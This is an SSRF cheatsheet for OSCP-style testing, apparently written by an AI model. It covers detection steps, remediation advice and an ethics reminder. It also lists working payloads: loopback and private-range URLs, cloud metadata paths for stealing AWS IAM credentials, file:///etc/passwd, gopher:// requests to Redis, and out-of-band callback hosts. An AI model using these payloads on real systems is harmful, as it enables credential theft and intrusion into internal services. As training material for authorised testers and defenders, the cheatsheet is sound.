## SSRF — Quick Cheatsheet

### Short definition

- **Server‑Side Request Forgery (SSRF):** attacker‑controlled input causes the server to make requests (HTTP, file, gopher, etc.) to internal or external resources. The server acts as an HTTP/TCP proxy, exposing internal endpoints, metadata services, or file contents.

---

### How SSRF works (short)

1. Application accepts a URL or resource identifier (parameters like `url`, `img`, `fetch`, `endpoint`, `callback`, `download`, `proxy`).
2. Server‑side code performs a fetch (HTTP client, curl, file_get_contents, requests, etc.) and returns or processes the response.
3. If the destination is attacker controlled or not validated/canonicalized, the attacker can direct requests to internal-only addresses, metadata endpoints, or special protocols.

---

### Quick detection checklist (OSCP style)

- Scope & legal: only test authorized targets (labs/CTFs, or with permission).
- Find candidate parameters: search for `url=`, `endpoint=`, `image=`, `callback=`, `import=`, `proxy=`, `download=`.
- Manual probes:
  - Replace the parameter with `http://127.0.0.1:80/` or `http://localhost:8080/` and look for differences in response.
  - Try cloud metadata addresses (use OOB where possible): `http://169.254.169.254/` and `http://metadata.google.internal/`.
- Blind SSRF detection (OOB required):
  - Use Burp Collaborator, Interactsh, or your own OOB server: `http://<id>.burpcollaborator.net/`.
  - Send unique tokens and watch for DNS/HTTP callbacks.
- Response‑based detection:
  - Returned HTML/JSON with internal content, error messages, headers from internal services.
  - Response size/content‑type mismatches or timing anomalies.
- Automation & fuzzing:
  - Small payload lists first (loopback, private ranges, metadata), then iterate hosts/ports.
  - Use ffuf, Burp Intruder, or custom scripts to fuzz parameter values.

---

### Useful payloads & test targets

Replace parameter value with these during tests.

- Loopback / localhost
  - `http://127.0.0.1/`
  - `http://127.0.0.1:80/`
  - `http://localhost:8080/`
- Private IPv4 ranges
  - `http://10.0.0.1/`, `http://172.16.0.1/`, `http://192.168.0.1/`
- IPv6 loopback
  - `http://[::1]/`
- Cloud metadata (high value)
  - AWS IMDSv1: `http://169.254.169.254/latest/meta-data/`
  - GCP metadata: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header)
  - Azure IMDS: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata:true`)
- Protocol tricks
  - `file:///etc/passwd` (may work if client accepts file URIs)
  - `gopher://127.0.0.1:6379/_<gopher‑payload>` (raw TCP to services like Redis)
- OOB / blind SSRF
  - `http://<unique>.burpcollaborator.net/`
  - `http://<your>.interact.sh/`

---

### Practical exploitation primitives

- Immediate info leak: fetch internal HTTP endpoints and read returned content (admin pages, internal APIs).
- Metadata APIs: attempt IMDS endpoints to enumerate role names and credentials on cloud instances.
  - Example AWS flow: `/latest/meta-data/iam/security-credentials/` → role name → `/latest/meta-data/iam/security-credentials/<role>`.
- Protocol abuse: use `gopher://` to craft raw TCP requests to local services (Redis, memcached) when the HTTP client supports it.
- Local file reads: `file://` or similar URIs can reveal files if the client fetcher returns file contents.
- Pivoting: use SSRF to reach internal services (Elasticsearch, Kibana, Jenkins, Docker API) and chain further attacks.
- Blind SSRF: rely on OOB channels (DNS/HTTP) to confirm requests when no content is returned.

---

### Example quick commands

Basic manual test (simple GET):

```bash
curl -i "https://target/app?url=http://127.0.0.1:8080/status"
```

OOB (blind) test:

1. Set the URL parameter to `http://<unique>.burpcollaborator.net/`.
2. Trigger the request and monitor the collaborator service for callbacks.

AWS metadata probe (only in labs):

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

When testing, prefer non‑destructive, read‑only probes and OOB detection first.

---

### Tools & approaches (OSCP relevant)

- Burp Suite: proxy, Repeater, Intruder, Collaborator.
- Interactsh / Burp Collaborator for blind/OOB detection.
- ffuf or custom scripts to fuzz hosts/ports/protocol prefixes.
- curl, httpie, python requests for manual probing.
- Small automation scripts to iterate internal IPs and common ports.

---

### Remediation (developer checklist)

- Use an allow‑list (whitelist) of permitted destinations; reject everything else.
- Canonicalize/normalize input and resolve DNS before validating; block based on the resolved IP.
- Block internal ranges at the HTTP client layer (127.0.0.1, 10/172/192 ranges, 169.254.0.0/16, IPv6 ::1, fc00::/7).
- Disallow risky protocols (gopher://, file://) unless explicitly needed and strictly controlled.
- Proxy outbound requests through a hardened application proxy that enforces policies and logging.
- Log outgoing requests to internal/metadata endpoints and alert on suspicious patterns.
- Harden cloud metadata services: enable IMDSv2 on AWS and use instance roles with least privilege.

---

### Safety & ethics

- Only test on systems you own or are explicitly authorized to test (OSCP labs, CTFs, company assets with permission).
- Document test steps and avoid destructive commands unless permitted.

---

If you want, I can also:

- generate a one‑page printable PDF of this cheatsheet,
- produce a Burp Intruder payload list or ffuf wordlist from the payload section, or
- add a short `ssrf-lab.md` with step‑by‑step lab exercise examples.

---

File created from an OSCP‑friendly SSRF summary (compact, checklist style).
